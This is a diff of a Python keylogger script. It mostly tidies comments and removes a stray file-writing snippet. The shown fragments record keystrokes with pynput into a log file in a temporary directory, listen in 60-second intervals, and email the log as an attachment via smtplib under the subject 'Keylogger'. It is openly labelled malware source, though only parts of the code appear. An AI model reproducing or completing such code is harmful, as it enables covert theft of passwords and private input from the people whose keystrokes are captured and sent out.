@@ -1,6 +1,4 @@
-'''f = open('file.txt', 'w')
-f.write('adfgsfdgfh')
-f.close()'''
+
 # All imports
 from pynput.keyboard import Listener #1
 import smtplib #2
@@ -33,9 +31,9 @@ def emailsender():
 
     msg['From'] = fromadd
     msg['To'] = toadd
-    msg['Subject'] = 'Keylogger' # add subj here
+    msg['Subject'] = 'Keylogger' # add subject here
 
-    msg.attach(MIMEText('log', 'plain')) # wite body here
+    msg.attach(MIMEText('log', 'plain')) # write body here
 
     #extension imp
     attachment = open(filename, 'rb')
@@ -63,13 +61,14 @@ def is_connected():
     except:
         pass
         print(False)
+        
 def filecreation():
     filename = save + '\\keylg' + '.txt'
     a = open (filename, "w+")
-    a.write(str(date.today())) #5
+    a.write(str(date.today())) 
 
 # main    
-save = tempfile.mkdtemp('file') #4
+save = tempfile.mkdtemp('file') 
 print (save)
 filecreation()
 
@@ -83,7 +82,7 @@ if is_connected() == True:
                 os.remove(filename)
                 filecreation()
                 
-            Thread(target=time_out, args=(60.0,)).start()
+            Thread(target=time_out, args=(60.0,)).start() #listening for 60 seconds. 
             ls.join()
     
     while True:
